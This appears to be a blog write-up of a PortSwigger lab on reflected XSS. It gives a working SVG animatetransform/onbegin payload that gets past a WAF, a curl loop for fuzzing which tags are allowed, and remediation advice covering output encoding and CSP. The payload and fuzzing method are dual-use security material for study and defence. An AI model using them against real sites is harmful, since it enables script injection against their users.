---
layout: post
title: "PortSwigger: Reflected XSS — SVG markup allowed (animatetransform + onbegin)"
date: 2027-06-11 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [portswigger, xss, cwe-79, waf-bypass, svg, animatetransform, onbegin, reflected-xss]
---

A reflected [cross-site scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html) lab where a WAF blocks all standard HTML tags and event handlers — but misses SVG-namespace elements entirely. The bypass: `<svg><animatetransform onbegin=alert(1)>`, which fires immediately on page parse with no user interaction.

## Overview

**Lab:** Reflected XSS with some SVG markup allowed  
**Source:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)  
**Vuln class:** [CWE-79 — Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

## The vulnerability

The search function reflects the `?search=` parameter directly into the HTML response. Standard payloads like `<img src=1 onerror=alert(1)>` and `<script>alert(1)</script>` are blocked by a WAF (HTTP 400). But the WAF's blocklist is HTML-focused and does not enumerate the SVG element namespace.

Probing reveals:
- `<img>` → 400 (blocked)
- `<svg>` → 200 (allowed)
- `<animatetransform>` → 200 (allowed)
- HTML events (`onload`, `onerror`, `onclick`) on any tag → 400
- `onbegin` on `<svg><animatetransform>` → 200 (allowed)

---

## Why `onbegin` fires without interaction

`<animatetransform>` is an SVG SMIL animation element. Its `onbegin` attribute fires a JavaScript handler the instant the animation starts. For an `<animatetransform>` with no `begin` attribute, the animation starts immediately on page parse — equivalent to `onload`, but in the SVG namespace where the WAF isn't looking.

The server response contains:

```html
<h1>0 search results for '<svg><animatetransform onbegin=alert(1)>'</h1>
```

The browser parses the SVG, starts the animation, fires `onbegin`, runs `alert(1)`. No click, no hover, no iframe resize trick needed.

---

## Working payload

```
GET /?search=<svg><animatetransform onbegin=alert(1)> HTTP/1.1
Host: <lab-instance>.h1-web-security-academy.net
```

URL-encoded:

```
/?search=%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%281%29%3E
```

Confirmed with headless chromium (dom_fire.py): `ALERT_FIRED: True`. Lab widget: `is-solved`.

---

## How to discover this pattern

WAF bypass methodology when standard payloads return 400:

1. Fuzz tag names — include SVG-specific elements in the probe list: `animatetransform`, `animate`, `title`, `image`, `set`.
2. For each allowed SVG animation element, fuzz SVG lifecycle events: `onbegin`, `onend`, `onrepeat`, `onload`.
3. Build the payload from the intersection of allowed tag + allowed event.

```bash
for tag in img svg animatetransform script body title image; do
  code=$(curl -sk "https://TARGET/?search=<${tag}>" -o /dev/null -w "%{http_code}")
  echo "${tag}: ${code}"
done
```

---

## The fix

The root cause is reflection without encoding, not a WAF gap. The WAF gap is what makes exploitation possible despite filtering, but the real fix is at the source:

- **Encode all reflected output**: `<` → `&lt;`, `>` → `&gt;` at the point of insertion into the HTML template, regardless of WAF coverage.
- **WAF-only defense fails**: any allowlist or blocklist based on tag/event enumeration has coverage gaps across HTML, SVG, and MathML namespaces.
- **Add CSP**: `default-src 'self'; script-src 'nonce-<random>'` as a defense-in-depth layer that survives WAF gaps.

---

## Key takeaway

SVG SMIL animation events (`onbegin`, `onend`, `onrepeat`) exist entirely outside the HTML event namespace. WAF blocklists that enumerate HTML events but ignore the SVG lifecycle leave this escape hatch open. When standard XSS payloads are blocked, always probe SVG-specific tags and their animation events before concluding a WAF is comprehensive.
